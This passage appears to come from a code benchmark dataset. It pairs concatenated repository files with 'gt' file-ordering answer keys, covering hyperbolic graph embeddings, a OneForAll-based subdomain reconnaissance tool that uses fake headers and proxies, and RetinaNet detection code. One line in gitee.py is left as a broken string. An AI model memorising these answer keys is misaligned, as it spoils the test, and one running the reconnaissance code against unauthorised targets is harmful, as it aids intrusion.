print_function\n\nfrom kg_hyp_emb.models.base import KGModel\nfrom kg_hyp_emb.utils import euclidean as euc_utils\nfrom kg_hyp_emb.utils import hyperbolic as hyp_utils\nimport numpy as np\nimport tensorflow as tf\n\n\nclass BaseH(KGModel):\n\n\n  def __init__(self, sizes, args):\n\n    super(BaseH, self).__init__(sizes, args)\n    self.c = tf.Variable(\n        initial_value=tf.keras.backend.ones(1), trainable=args.train_c)\n\n  def get_rhs(self, input_tensor):\n    c = tf.math.softplus(self.c)\n    return hyp_utils.expmap0(self.entity(input_tensor[:, 2]), c)\n\n  def get_candidates(self,):\n    c = tf.math.softplus(self.c)\n    return hyp_utils.expmap0(self.entity.embeddings, c)\n\n  def similarity_score(self, lhs, rhs, eval_mode):\n    c = tf.math.softplus(self.c)\n    return -hyp_utils.hyp_distance(lhs, rhs, c, eval_mode)**2\n\n\nclass TransH(BaseH):\n\n\n  def get_queries(self, input_tensor):\n    c = tf.math.softplus(self.c)\n    lhs = hyp_utils.expmap0(self.entity(input_tensor[:, 0]), c)\n    rel = hyp_utils.expmap0(self.rel(input_tensor[:, 1]), c)\n    res = hyp_utils.mobius_add(lhs, rel, c)\n    return res\n\n\nclass RotH(BaseH):\n\n\n  def __init__(self, sizes, args):\n    super(RotH, self).__init__(sizes, args)\n    self.rot = tf.keras.layers.Embedding(\n        input_dim=sizes[1],\n        output_dim=self.rank,\n        embeddings_initializer=self.initializer,\n        embeddings_regularizer=self.rel_regularizer,\n        name='rotation_weights')\n    self.rot_trans = tf.keras.layers.Embedding(\n        input_dim=sizes[1],\n        output_dim=self.rank,\n        embeddings_initializer=self.initializer,\n        embeddings_regularizer=self.rel_regularizer,\n        name='translation_weights')\n\n  def get_queries(self, input_tensor):\n    c = tf.math.softplus(self.c)\n    head = hyp_utils.expmap0(self.entity(input_tensor[:, 0]), c)\n    trans = hyp_utils.expmap0(self.rot_trans(input_tensor[:, 1]), c)\n    lhs = hyp_utils.mobius_add(head, trans, c)\n    rot = euc_utils.givens_rotations(self.rot(input_tensor[:, 1]), lhs)\n    rot = hyp_utils.project(rot, c)\n    rel = hyp_utils.expmap0(self.rel(input_tensor[:, 1]), c)\n    return hyp_utils.mobius_add(rot, rel, c)\n\n\nclass RefH(BaseH):\n\n\n  def __init__(self, sizes, args):\n    super(RefH, self).__init__(sizes, args)\n    self.ref = tf.keras.layers.Embedding(\n        input_dim=sizes[1],\n        output_dim=self.rank,\n        embeddings_initializer=self.initializer,\n        embeddings_regularizer=self.rel_regularizer,\n        name='reflection_weights')\n\n  def get_queries(self, input_tensor):\n    c = tf.math.softplus(self.c)\n    head = hyp_utils.expmap0(self.entity(input_tensor[:, 0]), c)\n    ref = euc_utils.givens_reflection(self.ref(input_tensor[:, 1]), head)\n    lhs = hyp_utils.project(ref, c)\n    rel = hyp_utils.expmap0(self.rel(input_tensor[:, 1]), c)\n    return hyp_utils.mobius_add(lhs, rel, c)\n\n\nclass AttH(BaseH):\n\n\n  def __init__(self, sizes, args):\n    super(AttH, self).__init__(sizes, args)\n    self.sim = 'dist'\n\n\n    self.ref = tf.keras.layers.Embedding(\n        input_dim=sizes[1],\n        output_dim=self.rank,\n        embeddings_initializer=self.initializer,\n        embeddings_regularizer=self.rel_regularizer,\n        name='reflection_weights')\n\n\n    self.rot = tf.keras.layers.Embedding(\n        input_dim=sizes[1],\n        output_dim=self.rank,\n        embeddings_initializer=self.initializer,\n        embeddings_regularizer=self.rel_regularizer,\n        name='rotation_weights')\n\n\n    self.context_vec = tf.keras.layers.Embedding(\n        input_dim=sizes[1],\n        output_dim=self.rank,\n        embeddings_initializer=self.initializer,\n        embeddings_regularizer=self.rel_regularizer,\n        name='context_embeddings')\n    self.scale = tf.keras.backend.ones(1) / np.sqrt(self.rank)\n\n  def get_reflection_queries(self, entity, ref):\n    queries = euc_utils.givens_reflection(ref, entity)\n    return tf.reshape(queries, (-1, 1, self.rank))\n\n  def get_rotation_queries(self, entity, rot):\n    queries = euc_utils.givens_rotations(rot, entity)\n    return tf.reshape(queries, (-1, 1, self.rank))\n\n  def get_queries(self, input_tensor):\n    c = tf.math.softplus(self.c)\n    entity = self.entity(input_tensor[:, 0])\n\n\n    rot = self.rot(input_tensor[:, 1])\n    ref = self.ref(input_tensor[:, 1])\n    ref_q = self.get_reflection_queries(entity, ref)\n    rot_q = self.get_rotation_queries(entity, rot)\n    cands = tf.concat([ref_q, rot_q], axis=1)\n\n\n    context_vec = self.context_vec(input_tensor[:, 1])\n    context_vec = tf.reshape(context_vec, (-1, 1, self.rank))\n    att_weights = tf.reduce_sum(\n        context_vec * cands * self.scale, axis=-1, keepdims=True)\n    att_weights = tf.nn.softmax(att_weights, axis=-1)\n    att_q = tf.reduce_sum(att_weights * cands, axis=1)\n    lhs = hyp_utils.expmap0(att_q, c)\n\n\n    rel = hyp_utils.expmap0(self.rel(input_tensor[:, 1]), c)\n    return hyp_utils.mobius_add(lhs, rel, c)\n\n'neural-structured-learning/research/kg_hyp_emb/train.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\nfrom __future__ import unicode_literals\n\nimport copy\nimport json\nimport logging as native_logging\nimport os\nimport sys\nimport time\n\nfrom absl import app\nfrom absl import flags\nfrom absl import logging\n\nfrom kg_hyp_emb.config import CONFIG\nfrom kg_hyp_emb.datasets.datasets import DatasetFn\nfrom kg_hyp_emb.learning.trainer import KGTrainer\nimport kg_hyp_emb.models as models\nimport kg_hyp_emb.utils.train as train_utils\nimport tensorflow as tf\n\nflag_fns = {\n    'string': flags.DEFINE_string,\n    'integer': flags.DEFINE_integer,\n    'boolean': flags.DEFINE_boolean,\n    'float': flags.DEFINE_float,\n}\nfor dtype, flag_fn in flag_fns.items():\n  for arg, (description, default) in CONFIG[dtype].items():\n    flag_fn(arg, default=default, help=description)\nFLAGS = flags.FLAGS\n\n\ndef main(_):\n\n  if FLAGS.save_logs:\n    if not os.path.exists(os.path.join(FLAGS.save_dir, 'train.log')):\n      os.makedirs(FLAGS.save_dir)\n      write_mode = 'w'\n    else:\n      write_mode = 'a'\n    stream = open(os.path.join(FLAGS.save_dir, 'train.log'), write_mode)\n    log_handler = native_logging.StreamHandler(stream)\n    print('Saving logs in {}'.format(FLAGS.save_dir))\n  else:\n    log_handler = native_logging.StreamHandler(sys.stdout)\n  formatter = native_logging.Formatter(\n      '%(asctime)s %(levelname)-8s %(message)s')\n  log_handler.setFormatter(formatter)\n  log_handler.setLevel(logging.INFO)\n  logger = logging.get_absl_logger()\n  logger.addHandler(log_handler)\n\n\n  dataset_path = os.path.join(FLAGS.data_dir, FLAGS.dataset)\n  dataset = DatasetFn(dataset_path, FLAGS.debug)\n  sizes = dataset.get_shape()\n  train_examples_reversed = dataset.get_examples('train')\n  valid_examples = dataset.get_examples('valid')\n  test_examples = dataset.get_examples('test')\n  filters = dataset.get_filters()\n  logging.info('\\t Dataset shape: %s', (str(sizes)))\n\n\n  config_path = os.path.join(FLAGS.save_dir, 'config.json')\n  if FLAGS.save_logs:\n    with open(config_path, 'w') as fjson:\n      json.dump(train_utils.get_config_dict(), fjson)\n\n\n  tf.keras.backend.set_floatx(FLAGS.dtype)\n  model = getattr(models, FLAGS.model)(sizes, FLAGS)\n  model.build(input_shape=(1, 3))\n  trainable_params = train_utils.count_params(model)\n  trainer = KGTrainer(sizes, FLAGS)\n  logging.info('\\t Total number of trainable parameters %s', (trainable_params))\n\n\n  if FLAGS.save_model:\n    ckpt = tf.train.Checkpoint(\n        step=tf.Variable(0), optimizer=trainer.optimizer, net=model)\n    manager = tf.train.CheckpointManager(ckpt, FLAGS.save_dir, max_to_keep=1)\n    if manager.latest_checkpoint:\n      ckpt.restore(manager.latest_checkpoint)\n      logging.info('\\t Restored from %s', (manager.latest_checkpoint))\n    else:\n      logging.info('\\t Initializing from scratch.')\n  else:\n    logging.info('\\t Initializing from scratch.')\n\n\n  logging.info('\\t Start training')\n  early_stopping_counter = 0\n  best_mrr = None\n  best_epoch = None\n  best_weights = None\n  if FLAGS.save_model:\n    epoch = ckpt.step\n  else:\n    epoch = 0\n\n  if int(epoch) < FLAGS.max_epochs:\n    while int(epoch) < FLAGS.max_epochs:\n      if FLAGS.save_model:\n        epoch.assign_add(1)\n      else:\n        epoch += 1\n\n\n      start = time.perf_counter()\n      train_batch = train_examples_reversed.batch(FLAGS.batch_size)\n      train_loss = trainer.train_step(model, train_batch).numpy()\n      end = time.perf_counter()\n      execution_time = (end - start)\n      logging.info('\\t Epoch %i | train loss: %.4f | total time: %.4f',\n                   int(epoch), train_loss, execution_time)\n\n      if FLAGS.save_model and int(epoch) % FLAGS.checkpoint == 0:\n        save_path = manager.save()\n        logging.info('\\t Saved checkpoint for epoch %i: %s', int(epoch),\n                     save_path)\n\n      if int(epoch) % FLAGS.valid == 0:\n\n        valid_batch = valid_examples.batch(FLAGS.batch_size)\n        valid_loss = trainer.valid_step(model, valid_batch).numpy()\n        logging.info('\\t Epoch %i | average valid loss: %.4f', int(epoch),\n                     valid_loss)\n\n\n        valid = train_utils.avg_both(*model.eval(valid_examples, filters))\n        logging.info(train_utils.format_metrics(valid, split='valid'))\n\n\n        valid_mrr = valid['MRR']\n        if not best_mrr or valid_mrr > best_mrr:\n          best_mrr = valid_mrr\n          early_stopping_counter = 0\n          best_epoch = int(epoch)\n          best_weights = copy.copy(model.get_weights())\n        else:\n          early_stopping_counter += 1\n          if early_stopping_counter == FLAGS.patience:\n            logging.info('\\t Early stopping')\n            break\n\n    logging.info('\\t Optimization finished')\n    logging.info('\\t Evaluating best model from epoch %s', best_epoch)\n    model.set_weights(best_weights)\n    if FLAGS.save_model:\n      model.save_weights(os.path.join(FLAGS.save_dir, 'best_model.ckpt'))\n\n\n    valid = train_utils.avg_both(*model.eval(valid_examples, filters))\n    logging.info(train_utils.format_metrics(valid, split='valid'))\n\n\n    test = train_utils.avg_both(*model.eval(test_examples, filters))\n    logging.info(train_utils.format_metrics(test, split='test'))\n  else:\n    logging.info('\\t Training completed')\n\n\nif __name__ == '__main__':\n  app.run(main)\n",
        "gt": [
            "'neural-structured-learning/research/kg_hyp_emb/models/base.py'",
            "'neural-structured-learning/research/kg_hyp_emb/models/hyperbolic.py'",
            "'neural-structured-learning/research/kg_hyp_emb/models/__init__.py'",
            "'neural-structured-learning/research/kg_hyp_emb/train.py'"
        ]
    },
    {
        "files": [
            "'Watchdog/client/subdomain/oneforall/modules/search/gitee.py'",
            "'Watchdog/client/subdomain/oneforall/common/search.py'",
            "'Watchdog/client/subdomain/oneforall/common/module.py'"
        ],
        "content": "'Watchdog/client/subdomain/oneforall/modules/search/gitee.py'\n:import time\nfrom bs4 import BeautifulSoup\nfrom client.subdomain.oneforall.common.search import Search\nfrom client.subdomain.oneforall.config import logger\n\n\nclass Gitee(Search):\n    def __init__(self, domain):\n        Search.__init__(self)\n        self.source = 'GiteeSearch'\n        self.module = 'Search'\n        self.addr = 'https://search.gitee.com/'\n        self.domain = self.register(domain)\n        self.header = self.get_header()\n\n    def search(self, full_search=False):\n\n        page_num = 1\n        while True:\n            time.sleep(self.delay)\n            params = {'pageno': page_num, 'q': self.domain, 'type': 'code'}\n            try:\n                resp = self.get(self.addr, params=params)\n            except Exception as e:\n                logger.log('ERROR', e.args)\n                break\n            if not resp:\n                break\n            if resp.status_code != 200:\n                logger.log('ERROR', f'{self.source}模块搜索出错')\n                break\n            if 'class=\"empty-box\"' in resp.text:\n                break\n            soup = BeautifulSoup(resp.text, 'html.parser')\n            subdomains = self.match(self.domain, soup.text)\n            self.subdomains = self.subdomains.union(subdomains)\n            if not subdomains:\n                break\n            if not full_search:\n\n                if subdomains.issubset(self.subdomains):\n                    break\n            if '<li class=\"disabled\"><a href=\"\n                break\n            if page_num > 100:\n                break\n            page_num += 1\n\n    def run(self):\n\n        self.begin()\n        self.search()\n        self.finish()\n        self.save_json()\n        self.gen_result()\n        self.save_db()\n\n\ndef do(domain):\n\n    query = Gitee(domain)\n    query.run()\n\n\nif __name__ == '__main__':\n    do('example.com')\n\n'Watchdog/client/subdomain/oneforall/common/search.py'\n:import client.subdomain.oneforall.config as config\nfrom .module import Module\nfrom . import utils\n\n\nclass Search(Module):\n\n    def __init__(self):\n        Module.__init__(self)\n        self.page_num = 0\n        self.per_page_num = 50\n        self.recursive_search = config.enable_recursive_search\n        self.recursive_times = config.search_recursive_times\n\n    @staticmethod\n    def filter(domain, subdomain):\n\n        statements_list = []\n        subdomains_temp = set(map(lambda x: x + '.' + domain,\n                                  config.subdomains_common))\n        subdomains_temp = list(subdomain.intersection(subdomains_temp))\n        for i in range(0, len(subdomains_temp), 2):\n            statements_list.append(''.join(set(map(lambda s: ' -site:' + s,\n                                                   subdomains_temp[i:i + 2]))))\n        return statements_list\n\n    def match_location(self, domain, url):\n\n        resp = self.head(url, check=False, allow_redirects=False)\n        if not resp:\n            return set()\n        location = resp.headers.get('location')\n        if not location:\n            return set()\n        return set(utils.match_subdomain(domain, location))\n\n'Watchdog/client/subdomain/oneforall/common/module.py'\n:\n\n\nimport json\nimport re\nimport threading\nimport time\n\nimport requests\nimport client.subdomain.oneforall.config as config\nfrom client.subdomain.oneforall.config import logger\nfrom . import utils\nfrom .domain import Domain\nfrom client.subdomain.oneforall.common.database import Database\n\nlock = threading.Lock()\n\n\nclass Module(object):\n    def __init__(self):\n        self.module = 'Module'\n        self.source = 'BaseModule'\n        self.cookie = None\n        self.header = dict()\n        self.proxy = None\n        self.delay = config.request_delay\n        self.timeout = config.request_timeout\n        self.verify = config.request_verify\n        self.domain = str()\n        self.type = 'A'\n        self.subdomains = set()\n        self.records = dict()\n        self.results = list()\n        self.start = time.time()\n        self.end = None\n        self.elapse = None\n\n    def check(self, *apis):\n\n        if not all(apis):\n            logger.log('ALERT', f'{self.source}模块没有配置API跳过执行')\n            return False\n        return True\n\n    def begin(self):\n\n        logger.log('DEBUG', f'开始执行{self.source}模块收集{self.domain}的子域')\n\n    def finish(self):\n\n        self.end = time.time()\n        self.elapse = round(self.end - self.start, 1)\n        logger.log('DEBUG', f'结束执行{self.source}模块收集{self.domain}的子域')\n        logger.log('INFOR', f'{self.source}模块耗时{self.elapse}秒发现子域'\n                            f'{len(self.subdomains)}个')\n        logger.log('DEBUG', f'{self.source}模块发现{self.domain}的子域\\n'\n                            f'{self.subdomains}')\n\n    def head(self, url, params=None, check=True, **kwargs):\n\n        try:\n            resp = requests.head(url,\n                                 params=params,\n                                 cookies=self.cookie,\n                                 headers=self.header,\n                                 proxies=self.proxy,\n                                 timeout=self.timeout,\n                                 verify=self.verify,\n                                 **kwargs)\n        except Exception as e:\n            logger.log('ERROR', e.args)\n            return None\n        if not check:\n            return resp\n        if utils.check_response('HEAD', resp):\n            return resp\n        return None\n\n    def get(self, url, params=None, check=True, **kwargs):\n\n        try:\n            resp = requests.get(url,\n                                params=params,\n                                cookies=self.cookie,\n                                headers=self.header,\n                                proxies=self.proxy,\n                                timeout=self.timeout,\n                                verify=self.verify,\n                                **kwargs)\n        except Exception as e:\n            logger.log('ERROR', e.args)\n            return None\n        if not check:\n            return resp\n        if utils.check_response('GET', resp):\n            return resp\n        return None\n\n    def post(self, url, data=None, check=True, **kwargs):\n\n        try:\n            resp = requests.post(url,\n                                 data=data,\n                                 cookies=self.cookie,\n                                 headers=self.header,\n                                 proxies=self.proxy,\n                                 timeout=self.timeout,\n                                 verify=self.verify,\n                                 **kwargs)\n        except Exception as e:\n            logger.log('ERROR', e.args)\n            return None\n        if not check:\n            return resp\n        if utils.check_response('POST', resp):\n            return resp\n        return None\n\n    def get_header(self):\n\n\n        if config.enable_fake_header:\n            return utils.gen_fake_header()\n        else:\n            return self.header\n\n    def get_proxy(self, module):\n\n        if not config.enable_proxy:\n            logger.log('TRACE', f'所有模块不使用代理')\n            return self.proxy\n        if config.proxy_all_module:\n            logger.log('TRACE', f'{module}模块使用代理')\n            return utils.get_random_proxy()\n        if module in config.proxy_partial_module:\n            logger.log('TRACE', f'{module}模块使用代理')\n            return utils.get_random_proxy()\n        else:\n            logger.log('TRACE', f'{module}模块不使用代理')\n            return self.proxy\n\n    @staticmethod\n    def match(domain, html, distinct=True):\n\n        logger.log('TRACE', f'正则匹配响应体中的子域')\n        regexp = r'(?:\\>|\\\"|\\'|\\=|\\,)(?:http\\:\\/\\/|https\\:\\/\\/)?' \\\n                 r'(?:[a-z0-9](?:[a-z0-9\\-]{0,61}[a-z0-9])?\\.){0,}' \\\n                 + domain.replace('.', r'\\.')\n        result = re.findall(regexp, html, re.I)\n        if not result:\n            return set()\n        regexp = r'(?:http://|https://)'\n        deal = map(lambda s: re.sub(regexp, '', s[1:].lower()), result)\n        if distinct:\n            return set(deal)\n        else:\n            return list(deal)\n\n    @staticmethod\n    def register(domain):\n\n        return Domain(domain).registered()\n\n    def save_json(self):\n\n        if not config.save_module_result:\n            return False\n        logger.log('TRACE', f'将{self.source}模块发现的子域结果保存为json文件')\n        path = config.result_save_dir.joinpath(self.domain, self.module)\n        path.mkdir(parents=True, exist_ok=True)\n        name = self.source + '.json'\n        path = path.joinpath(name)\n        with open(path, mode='w', encoding='utf-8', errors='ignore') as file:\n            result = {'domain': self.domain,\n                      'name': self.module,\n                      'source': self.source,\n                      'elapse': self.elapse,\n                      'find': len(self.subdomains),\n                      'subdomains': list(self.subdomains),\n                      'records': self.records}\n            json.dump(result, file, ensure_ascii=False, indent=4)\n        return True\n\n    def gen_record(self, subdomains, record):\n\n        item = dict()\n        item['content'] = record\n        for subdomain in subdomains:\n            self.records[subdomain] = item\n\n    def gen_result(self, find=0, brute=None, valid=0):\n\n        logger.log('DEBUG', f'正在生成最终结果')\n        if not len(self.subdomains):\n            result = {'id': None,\n                      'type': self.type,\n                      'alive': None,\n                      'request': None,\n                      'resolve': None,\n                      'new': None,\n                      'url': None,\n                      'subdomain': None,\n                      'level': None,\n                      'cname': None,\n                      'content': None,\n                      'public': None,\n                      'port': None,\n                      'status': None,\n                      'reason': None,\n                      'title': None,\n                      'banner': None,\n                      'header': None,\n                      'response': None,\n                      'times': None,\n                      'ttl': None,\n                      'resolver': None,\n                      'module': self.module,\n                      'source': self.source,\n                      'elapse': self.elapse,\n                      'find': find,\n                      'brute': brute,\n                      'valid': valid}\n            self.results.append(result)\n        else:\n            for subdomain in self.subdomains:\n                url = 'http://' + subdomain\n                level = subdomain.count('.') - self.domain.count('.')\n                record = self.records.get(subdomain)\n                if record is None:\n                    record = dict()\n                resolve = record.get('resolve')\n                request = record.get('request')\n                alive = record.get('alive')\n                if self.type != 'A':\n                    resolve = 1\n                    request = 1\n                    alive = 1\n                reason = record.get('reason')\n                resolver = record.get('resolver')\n                cname = record.get('cname')\n                content = record.get('content')\n                times = record.get('times')\n                ttl = record.get('ttl')\n                public = record.get('public')\n                if isinstance(cname, list):\n                    cname = ','.join(cname)\n                    content = ','.join(content)\n                    times = ','.join([str(num) for num in times])\n                    ttl = ','.join([str(num) for num in ttl])\n                    public = ','.join([str(num) for num in public])\n                result = {'id': None,\n                          'type': self.type,\n                          'alive': alive,\n                          'request': request,\n                          'resolve': resolve,\n                          'new': None,\n                          'url': url,\n                          'subdomain': subdomain,\n                          'level': level,\n                          'cname': cname,\n                          'content': content,\n                          'public': public,\n                          'port': 80,\n                          'status': None,\n                          'reason': reason,\n                          'title': None,\n                          'banner': None,\n                          'header': None,\n                          'response': None,\n                          'times': times,\n                          'ttl': ttl,\n                          'resolver': resolver,\n                          'module': self.module,\n                          'source': self.source,\n                          'elapse': self.elapse,\n                          'find': find,\n                          'brute': brute,\n                          'valid': valid,\n                          }\n                self.results.append(result)\n\n    def save_db(self):\n\n        logger.log('DEBUG', f'正在将结果存入到数据库')\n        lock.acquire()\n        db = Database()\n        db.create_table(self.domain)\n        db.save_db(self.domain, self.results, self.source)\n        db.close()\n        lock.release()\n",
        "gt": [
            "'Watchdog/client/subdomain/oneforall/common/module.py'",
            "'Watchdog/client/subdomain/oneforall/common/search.py'",
            "'Watchdog/client/subdomain/oneforall/modules/search/gitee.py'"
        ]
    },
    {
        "files": [
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/effnet.py'",
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/__init__.py'",
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/detect_all_images.py'"
        ],
        "content": "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/effnet.py'\n:\"\"\"\nCopyright 2017-2018 Fizyr (https://fizyr.com)\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n Describes backbone information and provides utility functions.\n     Returns a retinanet model using the correct backbone.\n         Downloads ImageNet weights and returns path to weights file.\n         Checks whether the backbone string is correct.\n        \"\"\"\n        allowed_backbones = ['EfficientNetB0', 'EfficientNetB1', 'EfficientNetB2', 'EfficientNetB3', 'EfficientNetB4',\n                             'EfficientNetB5', 'EfficientNetB6', 'EfficientNetB7']\n        backbone = self.backbone.split('_')[0]\n\n        if backbone not in allowed_backbones:\n            raise ValueError('Backbone (\\'{}\\') not in allowed backbones ({}).'.format(backbone, allowed_backbones))\n\n    def preprocess_image(self, inputs):\n\n        return efn.preprocess_input(inputs)\n\n\ndef effnet_retinanet(num_classes, backbone='EfficientNetB0', inputs=None, modifier=None, **kwargs):\n\n\n    if inputs is None:\n        if keras.backend.image_data_format() == 'channels_first':\n            inputs = keras.layers.Input(shape=(3, None, None))\n        else:\n\n            inputs = keras.layers.Input(shape=(None, None, 3))\n\n\n    if backbone == 'EfficientNetB0':\n        model = efn.EfficientNetB0(input_tensor=inputs, include_top=False, weights=None)\n    elif backbone == 'EfficientNetB1':\n        model = efn.EfficientNetB1(input_tensor=inputs, include_top=False, weights=None)\n    elif backbone == 'EfficientNetB2':\n        model = efn.EfficientNetB2(input_tensor=inputs, include_top=False, weights=None)\n    elif backbone == 'EfficientNetB3':\n        model = efn.EfficientNetB3(input_tensor=inputs, include_top=False, weights=None)\n    elif backbone == 'EfficientNetB4':\n        model = efn.EfficientNetB4(input_tensor=inputs, include_top=False, weights=None)\n    elif backbone == 'EfficientNetB5':\n        model = efn.EfficientNetB5(input_tensor=inputs, include_top=False, weights=None)\n    elif backbone == 'EfficientNetB6':\n        model = efn.EfficientNetB6(input_tensor=inputs, include_top=False, weights=None)\n    elif backbone == 'EfficientNetB7':\n        model = efn.EfficientNetB7(input_tensor=inputs, include_top=False, weights=None)\n    else:\n        raise ValueError('Backbone (\\'{}\\') is invalid.'.format(backbone))\n\n    layer_outputs = ['block4a_expand_activation', 'block6a_expand_activation', 'top_activation']\n\n    layer_outputs = [\n        model.get_layer(name=layer_outputs[0]).output,\n        model.get_layer(name=layer_outputs[1]).output,\n        model.get_layer(name=layer_outputs[2]).output,\n    ]\n\n    model = keras.models.Model(inputs=inputs, outputs=layer_outputs, name=model.name)\n\n\n    if modifier:\n        model = modifier(model)\n\n\n    backbone_layers = {\n        'C3': model.outputs[0],\n        'C4': model.outputs[1],\n        'C5': model.outputs[2]\n    }\n\n\n    return retinanet.retinanet(inputs=inputs, num_classes=num_classes, backbone_layers=backbone_layers, **kwargs)\n\n\ndef EfficientNetB0_retinanet(num_classes, inputs=None, **kwargs):\n    return effnet_retinanet(num_classes=num_classes, backbone='EfficientNetB0', inputs=inputs, **kwargs)\n\n\ndef EfficientNetB1_retinanet(num_classes, inputs=None, **kwargs):\n    return effnet_retinanet(num_classes=num_classes, backbone='EfficientNetB1', inputs=inputs, **kwargs)\n\n\ndef EfficientNetB2_retinanet(num_classes, inputs=None, **kwargs):\n    return effnet_retinanet(num_classes=num_classes, backbone='EfficientNetB2', inputs=inputs, **kwargs)\n\n\ndef EfficientNetB3_retinanet(num_classes, inputs=None, **kwargs):\n    return effnet_retinanet(num_classes=num_classes, backbone='EfficientNetB3', inputs=inputs, **kwargs)\n\n\ndef EfficientNetB4_retinanet(num_classes, inputs=None, **kwargs):\n    return effnet_retinanet(num_classes=num_classes, backbone='EfficientNetB4', inputs=inputs, **kwargs)\n\n\ndef EfficientNetB5_retinanet(num_classes, inputs=None, **kwargs):\n    return effnet_retinanet(num_classes=num_classes, backbone='EfficientNetB5', inputs=inputs, **kwargs)\n\n\ndef EfficientNetB6_retinanet(num_classes, inputs=None, **kwargs):\n    return effnet_retinanet(num_classes=num_classes, backbone='EfficientNetB6', inputs=inputs, **kwargs)\n\n\ndef EfficientNetB7_retinanet(num_classes, inputs=None, **kwargs):\n    return effnet_retinanet(num_classes=num_classes, backbone='EfficientNetB7', inputs=inputs, **kwargs)\n\n'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/__init__.py'\n:from __future__ import print_function\nimport sys\n\n\nclass Backbone(object):\n\n    def __init__(self, backbone):\n\n        from .. import layers\n        from .. import losses\n        from .. import initializers\n        self.custom_objects = {\n            'UpsampleLike'     : layers.UpsampleLike,\n            'PriorProbability' : initializers.PriorProbability,\n            'RegressBoxes'     : layers.RegressBoxes,\n            'FilterDetections' : layers.FilterDetections,\n            'Anchors'          : layers.Anchors,\n            'ClipBoxes'        : layers.ClipBoxes,\n            '_smooth_l1'       : losses.smooth_l1(),\n            '_focal'           : losses.focal(),\n        }\n\n        self.backbone = backbone\n        self.validate()\n\n    def retinanet(self, *args, **kwargs):\n\n        raise NotImplementedError('retinanet method not implemented.')\n\n    def download_imagenet(self):\n\n        raise NotImplementedError('download_imagenet method not implemented.')\n\n    def validate(self):\n\n        raise NotImplementedError('validate method not implemented.')\n\n    def preprocess_image(self, inputs):\n\n        raise NotImplementedError('preprocess_image method not implemented.')\n\n\ndef backbone(backbone_name):\n\n    if 'densenet' in backbone_name:\n        from .densenet import DenseNetBackbone as b\n    elif 'seresnext' in backbone_name or 'seresnet' in backbone_name or 'senet' in backbone_name:\n        from .senet import SeBackbone as b\n    elif 'resnet' in backbone_name:\n        from .resnet import ResNetBackbone as b\n    elif 'mobilenet' in backbone_name:\n        from .mobilenet import MobileNetBackbone as b\n    elif 'vgg' in backbone_name:\n        from .vgg import VGGBackbone as b\n    elif 'EfficientNet' in backbone_name:\n        from .effnet import EfficientNetBackbone as b\n    else:\n        raise NotImplementedError('Backbone class for  \\'{}\\' not implemented.'.format(backbone))\n\n    return b(backbone_name)\n\n\ndef load_model(filepath, backbone_name='resnet50'):\n\n    from tensorflow import keras\n    return keras.models.load_model(filepath, custom_objects=backbone(backbone_name).custom_objects)\n\n\ndef convert_model(model, nms=True, class_specific_filter=True, anchor_params=None, **kwargs):\n\n    from .retinanet import retinanet_bbox\n    return retinanet_bbox(model=model, nms=nms, class_specific_filter=class_specific_filter, anchor_params=anchor_params, **kwargs)\n\n\ndef assert_training_model(model):\n\n    assert(all(output in model.output_names for output in ['regression', 'classification'])), \\\n        \"Input is not a training model (no 'regression' and 'classification' outputs were found, outputs are: {}).\".format(model.output_names)\n\n\ndef check_training_model(model):\n\n    try:\n        assert_training_model(model)\n    except AssertionError as e:\n        print(e, file=sys.stderr)\n        sys.exit(1)\n\n'Keras-RetinaNet-for-Teknofest-2019/retinanet/detect_all_images.py'\n:\nfrom keras_retinanet import models\nfrom keras_retinanet.utils.image import read_image_bgr, preprocess_image, resize_image\nfrom keras_retinanet.utils.visualization import draw_box, draw_caption\nfrom keras_retinanet.utils.colors import label_color\nfrom keras_retinanet.utils.gpu import setup_gpu\n\n\nimport cv2\nimport os\nimport numpy as np\nimport time\nimport argparse\nfrom datetime import datetime\nimport json\nfrom tqdm import tqdm\n\nimport tensorflow as tf\nimport logging\ntf.get_logger().setLevel(logging.ERROR)\n\n\nmodel_interface_name = 'teknofest19_huma_resnet50_21_37_inference.h5'\nthresh = 0.22\n\nmodel_path = os.path.join('models', '', model_interface_name)\nmodel = models.load_model(model_path, backbone_name='resnet50')\n\nlabels_to_names = {0: 'arac', 1: 'yaya'}\n\nif not os.path.exists('results/'):\n    os.mkdir('results/')\n\ndt_now = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\nresults_path = os.path.join(\"results/\", \"{0}_{1}\".format(dt_now, model_interface_name))\nos.mkdir(results_path)\n\n\nimages_root_folder = \"../dataset_test/\"\n\n\nmodel = models.load_model(model_path, backbone_name='resnet50')\n\nsdd_images = os.listdir(images_root_folder)\nsdd_images = sorted(sdd_images, key=lambda name: int(name[:-4]))\n\n\n\nresults_json = []\nindex = 0\n\nstart = time.time()\nfor image_filename in tqdm(sdd_images):\n\n    image = read_image_bgr(images_root_folder + image_filename)\n\n    draw = image.copy()\n    draw = cv2.cvtColor(draw, cv2.COLOR_BGR2RGB)\n\n\n    image = preprocess_image(image)\n    image, scale = resize_image(image)\n\n\n    boxes, scores, labels = model.predict_on_batch(np.expand_dims(image, axis=0))\n\n    boxes /= scale\n\n\n    frame_json = {}\n\n    frame_json[\"frame_id\"] = int(image_filename.replace(\".jpg\",\"\").replace(\"../dataset_test/\",\"\"))\n    frame_json[\"nesneler\"] = []\n\n\n\n    for box, score, label in zip(boxes[0], scores[0], labels[0]):\n\n\n        if score < thresh:\n            break\n\n\n        colors = [[255,172,31], [161, 222, 251]]\n        color = colors[label]\n\n        landing_status = -1\n\n        b = box.astype(int)\n\n        if labels_to_names[label] == \"arac\":\n            draw_box(draw, b, color=color)\n\n\n\n            caption = \"{} {:.2f}%\".format(labels_to_names[label], score*100)\n            draw_caption(draw, b, caption, 